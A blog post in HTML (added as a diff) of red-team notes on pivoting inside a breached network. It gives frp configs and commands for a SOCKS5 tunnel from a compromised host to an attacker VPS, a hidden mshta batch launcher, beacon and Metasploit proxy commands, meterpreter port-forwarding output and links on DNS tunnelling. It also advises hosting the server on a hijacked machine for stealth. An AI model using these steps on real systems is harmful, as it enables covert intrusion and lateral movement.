@@ -1,0 +1,199 @@
+<!DOCTYPE html><html lang="zh-CN" data-default-color-scheme="&#34;auto&#34;"><head><meta charset="UTF-8"><link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png"><link rel="icon" type="image/png" href="/img/favicon.png"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,shrink-to-fit=no"><meta http-equiv="x-ua-compatible" content="ie=edge"><meta name="theme-color" content="#2f4154"><meta name="description" content="没有天生的大牛，更没有永远的菜鸟求知若饥 , 虚心若愚"><meta name="author" content="iceH"><meta name="keywords" content=""><title>红队攻防学习之穿透与转发 - iceH’s Blog</title><link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css"><link rel="stylesheet" href="/lib/hint/hint.min.css"><link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css"><link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/css/gundongtiao.css#%20%E6%BB%9A%E5%8A%A8%E6%9D%A1%E9%A2%9C%E8%89%B2.css"><link rel="stylesheet" href="/css/shubiao.css#%20%E9%BC%A0%E6%A0%87%E6%8C%87%E9%92%88.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><link rel="stylesheet" href="/css/valine.css"><script id="fluid-configs">var Fluid=window.Fluid||{},CONFIG={hostname:"www.secice.cn",root:"/",version:"1.8.5",typing:{enable:!0,typeSpeed:70,cursorChar:"_",loop:!1},toc:{enable:!0,headingSelector:"h1,h2,h3,h4,h5,h6",collapseDepth:0},anchorjs:{enable:!0,element:"h1,h2,h3,h4,h5,h6",placement:"right",visible:"hover",icon:""},copy_btn:!0,image_zoom:{enable:!0},lazyload:{enable:!0,onlypost:!1},web_analytics:{enable:!1,baidu:null,google:null,gtag:null,tencent:{sid:null,cid:null},woyaola:null,cnzz:null,leancloud:{app_id:null,app_key:null,server_url:null}}}</script><script src="/js/utils.js"></script><script src="/js/color-schema.js"></script><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="iceH’s Blog" type="application/atom+xml">
+</head><body><header style="height:70vh"><nav id="navbar" class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"><div class="container"><a class="navbar-brand" href="/">&nbsp;<strong>iceH's Blog</strong>&nbsp;</a> <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><div class="animated-icon"><span></span><span></span><span></span></div></button><div class="collapse navbar-collapse" id="navbarSupportedContent"><ul class="navbar-nav ml-auto text-center"><li class="nav-item"><a class="nav-link" href="/"><i class="iconfont icon-home-fill"></i> 首页</a></li><li class="nav-item dropdown"><a class="nav-link dropdown-toggle" href="#" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"><i class="iconfont icon-books"></i> 博文</a><div class="dropdown-menu" aria-labelledby="navbarDropdown"><a class="dropdown-item" href="/archives/"><i class="iconfont icon-archive-fill"></i> 归档 </a><a class="dropdown-item" href="/categories/"><i class="iconfont icon-category-fill"></i> 分类 </a><a class="dropdown-item" href="/tags/"><i class="iconfont icon-tags-fill"></i> 标签</a></div></li><li class="nav-item"><a class="nav-link" href="/playlist/"><i class="iconfont icon-music"></i> 音乐</a></li><li class="nav-item"><a class="nav-link" href="/about/"><i class="iconfont icon-user-fill"></i> 关于</a></li><li class="nav-item"><a class="nav-link" href="/links/"><i class="iconfont icon-link-fill"></i> 友链</a></li><li class="nav-item" id="search-btn"><a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i class="iconfont icon-search"></i>&nbsp;</a></li><li class="nav-item" id="color-toggle-btn"><a class="nav-link" href="javascript:">&nbsp;<i class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a></li></ul></div></div></nav><div class="banner intro-2" id="background" parallax="true" style="background:url(/img/background1.jpg) no-repeat center center;background-size:cover"><div class="full-bg-img"><div class="mask flex-center" style="background-color:rgba(0,0,0,.3)"><div class="page-header text-center fade-in-up"><span class="h2" id="subtitle" title="红队攻防学习之穿透与转发"></span><div class="mt-3"><span class="post-meta"><i class="iconfont icon-date-fill" aria-hidden="true"></i> <time datetime="2020-12-22 11:22" pubdate>2020年12月22日 上午</time></span></div><div class="mt-1"><span class="post-meta mr-2"><i class="iconfont icon-chart"></i> 2.4k 字 </span><span class="post-meta mr-2"><i class="iconfont icon-clock-fill"></i> 34 分钟</span></div></div></div></div></div></header><main><div class="container-fluid"><div class="row"><div class="d-none d-lg-block col-lg-2"></div><div class="col-lg-8 nopadding-md"><div class="container nopadding-md" id="board-ctn"><div class="py-5" id="board"><article class="post-content mx-auto"><h1 style="display:none">红队攻防学习之穿透与转发</h1><div class="markdown-body"><h1 id="四、穿透与转发"><a href="#四、穿透与转发" class="headerlink" title="四、穿透与转发"></a>四、穿透与转发</h1><h2 id="1、Frp内网穿透实战"><a href="#1、Frp内网穿透实战" class="headerlink" title="1、Frp内网穿透实战"></a>1、Frp内网穿透实战</h2><p>可以使用参数版frp</p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h3><p>实战中，当通过某种方式拿下测试虚拟机权限时，发现该机器可出网。此时为了内网横向渗透与团队间的协同作战，可以利用Frp在该机器与VPS之间建立一条“专属通道”，并借助这条通道达到内网穿透的效果。实战中更多时候依靠 Socks5 。</p><p>更多详细使用方法，可查看官方Github，这里不再赘述。</p><ul><li><a target="_blank" rel="noopener" href="https://github.com/fatedier/frp/">https://github.com/fatedier/frp/</a></li></ul><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a><strong>前期准备</strong></h3><p>先准备一台VPS与域名。</p><p>因某种情况会更换VPS地址，为了减少更改frp配置文件的次数，所以做域名泛解析。若更换VPS，直接编辑域名解析地址即可。</p><h3 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a><strong>下载地址</strong></h3><p>Frp下载地址 [跨平台，实战中根据目标机版本选择下载]</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/fatedier/</span>frp/releases</code></pre><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a><strong>配置文件</strong></h3><h4 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a><strong>服务端</strong></h4><pre><code class="hljs ini"><span class="hljs-comment">#通用配置段</span>
+<span class="hljs-section">[common]</span>
+<span class="hljs-comment">#frp服务端监听 [VPS]</span>
+<span class="hljs-attr">bind_addr</span> = <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>
+<span class="hljs-comment">#frp服务器监听端口 [实战中可以用一些通透性较好的端口]</span>
+<span class="hljs-attr">bind_port</span> = <span class="hljs-number">7007</span>
+
+<span class="hljs-comment">#服务端Web控制面板登录端口 [通过控制面板，可以实时了解到数据收发情况。实战中用处不大]</span>
+<span class="hljs-attr">dashboard_port</span> = <span class="hljs-number">6609</span>
+
+<span class="hljs-comment">#服务端Web控制面板用户名与密码 [强口令]</span>
+<span class="hljs-attr">dashboard_user</span> = SuperMan
+<span class="hljs-attr">dashboard_pwd</span> = WC3pvjmh2tt8
+
+<span class="hljs-comment">#日志输出位置，所有的日志信息都放到当前目录下的frps.log文件中</span>
+<span class="hljs-attr">log_file</span> = ./frps.log
+<span class="hljs-comment">#日志记录等级，有trace、debug、info、warn、error,通常情况下为info</span>
+<span class="hljs-attr">log_level</span> = info
+<span class="hljs-comment">#日志保留时间</span>
+<span class="hljs-attr">log_max_days</span> = <span class="hljs-number">3</span>
+
+<span class="hljs-comment">#验证凭据，服务端和客户端的凭据必须一样才能连接</span>
+<span class="hljs-attr">auth_token</span> = E0iQEBOdoJeh
+
+<span class="hljs-comment">#启用特权模式，从v0.10.0版本开始默认启用特权模式 [特权模式下，客户端更改配置无需更新服务端]</span>
+<span class="hljs-attr">privilege_mode</span> = <span class="hljs-literal">true</span>
+<span class="hljs-comment">#特权模式Token [强口令，建议随机生成]</span>
+<span class="hljs-attr">privilege_token</span> = kukezkHC8R1H
+<span class="hljs-comment">#特权模式允许分配的端口 [避免端口被滥用]</span>
+<span class="hljs-attr">privilege_allow_ports</span> = <span class="hljs-number">4000</span>-<span class="hljs-number">50000</span>
+
+<span class="hljs-comment">#心跳检测超时时长</span>
+<span class="hljs-attr">heartbeat_timeout</span> = <span class="hljs-number">30</span>
+
+<span class="hljs-comment">#每个代理可以设置的连接池上限</span>
+<span class="hljs-attr">max_pool_count</span> = <span class="hljs-number">20</span>
+
+<span class="hljs-comment">#口令认证超时时间，一般不用改</span>
+<span class="hljs-attr">authentication_timeout</span> = <span class="hljs-number">900</span>
+
+<span class="hljs-comment">#指定子域名，后续将全部用域名的形式进行访问 [特权模式需下将 *.xxxx.online 解析到外网VPS上，即域名泛解析]</span>
+<span class="hljs-attr">subdomain_host</span> = xxxx.<span class="hljs-literal">on</span>line</code></pre><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a><strong>客户端</strong></h4><pre><code class="hljs ini"><span class="hljs-comment">#通用配置段</span>
+<span class="hljs-section">[common]</span>
+<span class="hljs-comment">#frp服务端IP或域名 [实战中一般都会直接用域名]</span>
+<span class="hljs-attr">server_addr</span> = frp.xxxx.<span class="hljs-literal">on</span>line
+<span class="hljs-comment">#frp服务器端口</span>
+<span class="hljs-attr">server_port</span> = <span class="hljs-number">7007</span>
+
+<span class="hljs-comment">#授权token，此处必须与服务端保持一致，否则无法建立连接</span>
+<span class="hljs-attr">auth_token</span> = E0iQEBOdoJeh
+
+<span class="hljs-comment">#启用特权模式 [特权模式下服务端无需配置]</span>
+<span class="hljs-attr">privilege_mode</span> = <span class="hljs-literal">true</span>
+<span class="hljs-comment">#特权模式 token,同样要与服务端完全保持一致</span>
+<span class="hljs-attr">privilege_token</span> = kukezkHC8R1H
+
+<span class="hljs-comment">#心跳检查间隔与超时时间</span>
+<span class="hljs-attr">heartbeat_interval</span> = <span class="hljs-number">10</span>
+<span class="hljs-attr">heartbeat_timeout</span> = <span class="hljs-number">30</span>
+
+<span class="hljs-comment">#启用加密 [通信内容加密传输，有效防止流量被拦截]</span>
+<span class="hljs-attr">use_encryption</span> = <span class="hljs-literal">true</span>
+
+<span class="hljs-comment">#启用压缩 [传输内容进行压缩，有效减小传输的网络流量，加快流量转发速度，但会额外消耗一些CPU资源]</span>
+<span class="hljs-attr">use_compression</span> = <span class="hljs-literal">true</span>
+
+<span class="hljs-comment">#连接数量</span>
+<span class="hljs-attr">pool_count</span> = <span class="hljs-number">20</span>
+
+<span class="hljs-comment">#内网穿透通常用socks5</span>
+<span class="hljs-section">[socks5]</span>
+<span class="hljs-attr">type</span> = tcp
+
+<span class="hljs-comment">#连接VPS内网穿透的远程连接端口</span>
+<span class="hljs-attr">remote_port</span> = <span class="hljs-number">9066</span>
+
+<span class="hljs-comment">#使用插件socks5代理</span>
+<span class="hljs-attr">plugin</span> = socks5
+
+<span class="hljs-comment">#socks5连接口令 [根据实际情况进行配置]</span>
+<span class="hljs-comment">#plugin_user = SuperMan</span>
+<span class="hljs-comment">#plugin_passwd = ZBO0McQe6mE1</span></code></pre><h3 id="执行部署"><a href="#执行部署" class="headerlink" title="执行部署"></a><strong>执行部署</strong></h3><h4 id="服务端-1"><a href="#服务端-1" class="headerlink" title="服务端"></a><strong>服务端</strong></h4><p>SSH连接到VPS上，后台启动frp服务端。</p><pre><code class="hljs bash">root@Ubuntu:~<span class="hljs-comment"># cd tools/frp/</span>
+root@Ubuntu:~/tools/frp<span class="hljs-comment"># nohup ./frps -c frps.ini &amp;</span>
+root@Ubuntu:~/tools/frp<span class="hljs-comment"># jobs -l</span>
+root@Ubuntu:~/tools/frp<span class="hljs-comment"># cat frps.log</span></code></pre><h4 id="客户端-1"><a href="#客户端-1" class="headerlink" title="客户端"></a><strong>客户端</strong></h4><p>将frpc.exe与frpc.ini传到目标机的同一目录下，直接运行。</p><p>当frp客户端启动后，是否成功连接，都会在frp服务端日志中查看到</p><p>但如果直接在目标机的Beacon中启动frp客户端，会持续有日志输出，并干扰该pid下的其他操作，所以可结合execute在目标机无输出执行程序</p><pre><code class="hljs smali">beacon&gt; sleep 10
+beacon&gt;<span class="hljs-built_in"> execute </span>c:/frpc.exe -c c:/frpc.ini
+beacon&gt; shell netstat -ano |findstr 7007</code></pre><p>或者，创建后台运行的bat脚本。</p><pre><code class="hljs bat">@<span class="hljs-built_in">echo</span> off
+<span class="hljs-keyword">if</span> &quot;%<span class="hljs-number">1</span>&quot; == &quot;h&quot; <span class="hljs-keyword">goto</span> begin
+mshta vbscript:createobject(&quot;wscript.shell&quot;).run(&quot;%~nx0 h&quot;,<span class="hljs-number">0</span>)(window.close)&amp;&amp;<span class="hljs-keyword">exit</span>
+:begin
+<span class="hljs-function">c:\<span class="hljs-title">frpc.exe</span> -<span class="hljs-title">c</span> <span class="hljs-title">c</span>:\<span class="hljs-title">frpc.ini</span></span></code></pre><h3 id="工具穿透"><a href="#工具穿透" class="headerlink" title="工具穿透"></a><strong>工具穿透</strong></h3><h4 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a><strong>Metasploit</strong></h4><p>当“专属通道”打通后，可直接在msf中挂该代理。因为msf的模块较多，所以在内网横向移动中更是一把利器。[若socks5设置口令，可结合proxychains]</p><pre><code class="hljs apache"><span class="hljs-attribute">msf5</span> &gt; setg proxies socks<span class="hljs-number">5</span>:frp.xxxx.online:<span class="hljs-number">9066</span>
+<span class="hljs-attribute">msf5</span> &gt; use auxiliary/scanner/smb/smb_ms<span class="hljs-number">17</span>_<span class="hljs-number">010</span>
+<span class="hljs-attribute">msf5</span> auxiliary(scanner/smb/smb_ms<span class="hljs-number">17</span>_<span class="hljs-number">010</span>) &gt; set threads <span class="hljs-number">10</span>
+<span class="hljs-attribute">msf5</span> auxiliary(scanner/smb/smb_ms<span class="hljs-number">17</span>_<span class="hljs-number">010</span>) &gt; set rhosts <span class="hljs-number">192.168.144.178</span>
+<span class="hljs-attribute">msf5</span> auxiliary(scanner/smb/smb_ms<span class="hljs-number">17</span>_<span class="hljs-number">010</span>) &gt; run</code></pre><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a><strong>Windows</strong></h4><p>Windows中可结合Proxifier、SSTap等工具，可设置socks5口令，以此达到用windows渗透工具横向穿透的效果</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a><strong>小结</strong></h3><p>Frp的用法比较灵活且运行稳定。如 可将frp服务端挂在“做菜的肉鸡”上，以达到隐蔽性，也可将客户端做成服务自启的形式等</p><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://mp.weixin.qq.com/s?__biz=MzU<span class="hljs-number">1</span>NjgzOTAyMg==&amp;mid=<span class="hljs-number">2247485563</span>&amp;idx=<span class="hljs-number">2</span>&amp;sn=<span class="hljs-number">1163136</span>fa<span class="hljs-number">1</span>e<span class="hljs-number">407</span>bef<span class="hljs-number">053</span>a<span class="hljs-number">7</span>ce<span class="hljs-number">8</span>c<span class="hljs-number">6</span>f<span class="hljs-number">1</span>fb<span class="hljs-number">4</span>&amp;chksm=fc<span class="hljs-number">3</span>fb<span class="hljs-number">17</span>acb<span class="hljs-number">48386</span>c<span class="hljs-number">0</span>d<span class="hljs-number">41802</span>ee<span class="hljs-number">5</span>f<span class="hljs-number">2</span>e<span class="hljs-number">1469</span>d<span class="hljs-number">192422</span>d<span class="hljs-number">80</span>c<span class="hljs-number">1</span>b<span class="hljs-number">03</span>ed<span class="hljs-number">476</span>beec<span class="hljs-number">419</span>c<span class="hljs-number">43</span>e<span class="hljs-number">06</span>e<span class="hljs-number">341621</span>a<span class="hljs-number">26</span>&amp;scene=<span class="hljs-number">21</span>    ---AnonySec 感谢大佬</code></pre><hr><h2 id="2、基于ported端口转发"><a href="#2、基于ported端口转发" class="headerlink" title="2、基于ported端口转发"></a>2、基于ported端口转发</h2><p>portfwd是一款强大的端口转发工具，支持TCP，UDP，支持IPV4–IPV6的转换转发。并且内置于meterpreter。其中exe单版本源码如下：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/rssnsj/</span>portfwd</code></pre><p><strong>攻击机：</strong></p><pre><code class="hljs accesslog"><span class="hljs-number">192.168.1.5</span> Debian</code></pre><p><strong>靶机：</strong></p><pre><code class="hljs accesslog"><span class="hljs-number">192.168.1.4</span> Windows <span class="hljs-number">7</span>
+<span class="hljs-number">192.168.1.119</span> Windows <span class="hljs-number">2003</span></code></pre><pre><code class="hljs sql">msf exploit(multi/<span class="hljs-keyword">handler</span>) \&gt; sessions ‐l 
+
+Active sessions
+===============
+
+<span class="hljs-keyword">Id</span> <span class="hljs-keyword">Name</span> <span class="hljs-keyword">Type</span> Information <span class="hljs-keyword">Connection</span>
+‐‐ ‐‐‐‐ ‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐
+<span class="hljs-number">1</span> meterpreter x86/windows WIN03X64\Administrator @ WIN03X64 <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.5</span>:<span class="hljs-number">45303</span> ‐&gt; <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.119</span>:<span class="hljs-number">53</span> (<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.119</span>)
+
+msf exploit(multi/<span class="hljs-keyword">handler</span>) &gt; sessions ‐i <span class="hljs-number">1</span> ‐c <span class="hljs-string">&#x27;ipconfig&#x27;</span>
+[*] Running <span class="hljs-string">&#x27;ipconfig&#x27;</span> <span class="hljs-keyword">on</span> meterpreter <span class="hljs-keyword">session</span> <span class="hljs-number">1</span> (<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.119</span>) 
+
+Windows IP Configuration 
+
+Ethernet adapter 本地连接:
+
+<span class="hljs-keyword">Connection</span>‐specific DNS Suffix . :
+
+IP Address. . . . . . . . . . . . : <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.119</span>
+Subnet <span class="hljs-keyword">Mask</span> . . . . . . . . . . . : <span class="hljs-number">255.255</span><span class="hljs-number">.255</span><span class="hljs-number">.0</span>
+<span class="hljs-keyword">Default</span> Gateway . . . . . . . . . : <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span> <span class="hljs-number">22</span>
+<span class="hljs-number">123456789101112131415161718192021</span></code></pre><p><strong>靶机IP为：</strong><br>192.168.1.119—windows 2003—x64</p><p>需要转发端口为：80，3389</p><pre><code class="hljs dns">msf exploit(multi/handler) &gt; sessions ‐i <span class="hljs-number">1</span>
+[*] Starting interaction with <span class="hljs-number">1</span>... 
+
+meterpreter &gt; shell
+Process <span class="hljs-number">4012</span> created.
+Channel <span class="hljs-number">56</span> created.
+Microsoft Windows [版本 <span class="hljs-number">5.2.3790</span>]
+(C) 版权所有 <span class="hljs-number">1985‐2003</span> Microsoft Corp.
+
+C:\Documents and Settings\Administrator\桌面&gt;if defined PSModulePath (echo ok!) else (echo sorry!)
+if defined PSModulePath (echo ok!) else (echo sorry!)
+sorry! 
+
+C:\Documents and Settings\Administrator\桌面&gt;net config Workstation
+net config Workstation
+计算机名 \\WIN03X64
+计算机全名 win03x64
+用户名 Administrator
+
+工作站正运行于
+NetbiosSmb (<span class="hljs-number">000000000000</span>)
+NetBT_Tcpip_&#123;<span class="hljs-number">37C12280</span>‐A19D‐<span class="hljs-number">4</span>D1A‐<span class="hljs-number">9365</span>‐<span class="hljs-number">6</span>CBF2CAE5B07&#125; (<span class="hljs-number">000</span>C2985D67D) 
+
+软件版本 Microsoft Windows Server <span class="hljs-number">2003</span>
+
+工作站域 WORKGROUP
+登录域 WIN03X64
+
+COM 打开超时 (秒) <span class="hljs-number">0</span>
+COM 发送计数 (字节) <span class="hljs-number">16</span>
+COM 发送超时 (毫秒) <span class="hljs-number">250</span>
+命令成功完成。
+
+C:\Documents and Settings\Administrator\桌面&gt;netstat ‐an|findstr &quot;LIST ENING&quot;
+netstat ‐an|findstr &quot;LISTENING&quot;
+TCP <span class="hljs-number">0.0.0.0</span>:<span class="hljs-number">80 0.0.0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">0</span> LISTENING
+TCP <span class="hljs-number">0.0.0.0</span>:<span class="hljs-number">135 0.0.0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">0</span> LISTENING
+TCP <span class="hljs-number">0.0.0.0</span>:<span class="hljs-number">445 0.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">0</span> LISTENING
+TCP <span class="hljs-number">0.0.0.0</span>:<span class="hljs-number">1025 0.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">0</span> LISTENING
+TCP <span class="hljs-number">0.0.0.0</span>:<span class="hljs-number">1026 0.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">0</span> LISTENING
+TCP <span class="hljs-number">0.0.0.0</span>:<span class="hljs-number">3078 0.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">0</span> LISTENING
+TCP <span class="hljs-number">0.0.0.0</span>:<span class="hljs-number">3389 0.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">0</span> LISTENING
+TCP <span class="hljs-number">0.0.0.0</span>:<span class="hljs-number">9001 0.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">0</span> LISTENING
+TCP <span class="hljs-number">127.0.0.1</span>:<span class="hljs-number">2995 0.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">0</span> LISTENING
+TCP <span class="hljs-number">127.0.0.1</span>:<span class="hljs-number">9000 0.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">0</span> LISTENING
+TCP <span class="hljs-number">127.0.0.1</span>:<span class="hljs-number">9999 0.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">0</span> LISTENING
+TCP <span class="hljs-number">192.168.1.119</span>:<span class="hljs-number">139 0.0.0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">0</span> LISTENING</code></pre><pre><code class="hljs pf">meterpreter &gt; portfwd ‐h
+Usage: portfwd [‐h] [add | delete | list | <span class="hljs-keyword">flush</span>] [args] 
+
+OPTIONS:
+‐L <span class="hljs-variable">&lt;opt&gt;</span> Forward: local host <span class="hljs-keyword">to</span> listen <span class="hljs-keyword">on</span> (optional). Reverse: local host <span class="hljs-keyword">to</span> connect <span class="hljs-keyword">to</span>.
+‐R Indicates a reverse <span class="hljs-keyword">port</span> forward.
+‐h Help banner.
+‐i <span class="hljs-variable">&lt;opt&gt;</span> Index of the <span class="hljs-keyword">port</span> forward entry <span class="hljs-keyword">to</span> interact with (see the <span class="hljs-string">&quot;list&quot;</span> command).
+‐l <span class="hljs-variable">&lt;opt&gt;</span> Forward: local <span class="hljs-keyword">port</span> <span class="hljs-keyword">to</span> listen <span class="hljs-keyword">on</span>. Reverse: local <span class="hljs-keyword">port</span> <span class="hljs-keyword">to</span> connect <span class="hljs-keyword">to</span>.
+‐p <span class="hljs-variable">&lt;opt&gt;</span> Forward: remote <span class="hljs-keyword">port</span> <span class="hljs-keyword">to</span> connect <span class="hljs-keyword">to</span>. Reverse: remote <span class="hljs-keyword">port</span> <span class="hljs-keyword">to</span> listen <span class="hljs-keyword">on</span>.
+‐r <span class="hljs-variable">&lt;opt&gt;</span> Forward: remote host <span class="hljs-keyword">to</span> connect <span class="hljs-keyword">to</span>.
+<span class="hljs-number">1234567891011</span></code></pre><p><strong>攻击机执行：</strong></p><pre><code class="hljs dns">meterpreter &gt; portfwd add ‐l <span class="hljs-number">33389</span> ‐r <span class="hljs-number">192.168.1.119</span> ‐p <span class="hljs-number">3389</span>
+[*] Local TCP relay created: :<span class="hljs-number">33389</span> &lt;‐&gt; <span class="hljs-number">192.168.1.119</span>:<span class="hljs-number">3389</span>
+meterpreter &gt; portfwd add ‐l <span class="hljs-number">30080</span> ‐r <span class="hljs-number">192.168.1.119</span> ‐p <span class="hljs-number">80</span>
+[*] Local TCP relay created: :<span class="hljs-number">30080</span> &lt;‐&gt; <span class="hljs-number">192.168.1.119</span>:<span class="hljs-number">80</span>
+meterpreter &gt; portfwd 
+
+Active Port Forwards
+==================== 
+Index Local Remote Direction
+‐‐‐‐‐ ‐‐‐‐‐ ‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐
+<span class="hljs-number">1 0.0.0</span>.<span class="hljs-number">0:33389 192</span>.<span class="hljs-number">168.1.119</span>:<span class="hljs-number">3389</span> Forward
+<span class="hljs-number">2 0.0.0</span>.<span class="hljs-number">0:30080 192</span>.<span class="hljs-number">168.1.119:80</span> Forward 
+
+<span class="hljs-number">2</span> total active port forwards.</code></pre><p>查看攻击机LISTEN端口：转发已成功</p><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@John:~# netstat ‐ntlp |grep :<span class="hljs-number">3</span>
+<span class="hljs-attribute">tcp</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0.0.0.0:33389</span> <span class="hljs-number">0.0.0.0</span>:* LISTEN <span class="hljs-number">2319</span>/ruby
+<span class="hljs-attribute">tcp</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0.0.0.0:30080</span> <span class="hljs-number">0.0.0.0</span>:* LISTEN <span class="hljs-number">2319</span>/ruby <span class="hljs-number">4</span></code></pre><p>Windows 7 分别访问攻击机33389，30080，既等价访问靶机3389，80</p><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://micro<span class="hljs-number">8</span>.gitbook.io/micro<span class="hljs-number">8</span>/contents-<span class="hljs-number">1</span>/<span class="hljs-number">91</span>-<span class="hljs-number">100</span>/<span class="hljs-number">95</span>-ji-yu-portfwd-duan-kou-zhuan-fa</code></pre><hr><h2 id="3、Venom-代理转发、多级穿透"><a href="#3、Venom-代理转发、多级穿透" class="headerlink" title="3、Venom-代理转发、多级穿透"></a>3、Venom-代理转发、多级穿透</h2><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.ms509.com<span class="hljs-regexp">/2020/</span><span class="hljs-number">06</span><span class="hljs-regexp">/17/</span>Intranet-penetration/   --非常详细全面的内网穿透技术总结
+https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/u011215939/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">103403545</span>
+https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">4058</span>   --Venom 渗透测试人员的多级代理
+http:<span class="hljs-regexp">//</span>www.vkxss.top<span class="hljs-regexp">/2020/</span><span class="hljs-number">04</span><span class="hljs-regexp">/30/</span>内网渗透-Venom内网工具使用实战/</code></pre><hr><h2 id="4、DNS隧道"><a href="#4、DNS隧道" class="headerlink" title="4、DNS隧道"></a>4、DNS隧道</h2><h3 id="dns隧道之dns2tcp"><a href="#dns隧道之dns2tcp" class="headerlink" title="dns隧道之dns2tcp"></a>dns隧道之dns2tcp</h3><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>blog.dengxj.com<span class="hljs-regexp">/archives/</span><span class="hljs-number">14</span>/
+https:<span class="hljs-regexp">//m</span>ntn0x.github.io<span class="hljs-regexp">/2020/</span><span class="hljs-number">03</span><span class="hljs-regexp">/24/</span>DNS隧道搭建/
+https:<span class="hljs-regexp">//</span>blog.werner.wiki<span class="hljs-regexp">/building-a-dns-tunnel-with-dns2tcp/</span>   --使用dns2tcp搭建DNS隧道(老文章思路）</code></pre><p>书里的思路也很好…</p><hr><h3 id="dns隧道之dnscat2"><a href="#dns隧道之dnscat2" class="headerlink" title="dns隧道之dnscat2"></a>dns隧道之dnscat2</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.<span class="hljs-number">4</span>hou.com<span class="hljs-regexp">/posts/</span>PY0A   --DNScat2工具:通过DNS进行C&amp;C通信
+https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/weixin_41598660/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">106658548</span>   --最新复现文章</code></pre><h3 id="dns隧道之Iodine"><a href="#dns隧道之Iodine" class="headerlink" title="dns隧道之Iodine"></a>dns隧道之Iodine</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>zhuanlan.zhihu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">70263701</span>
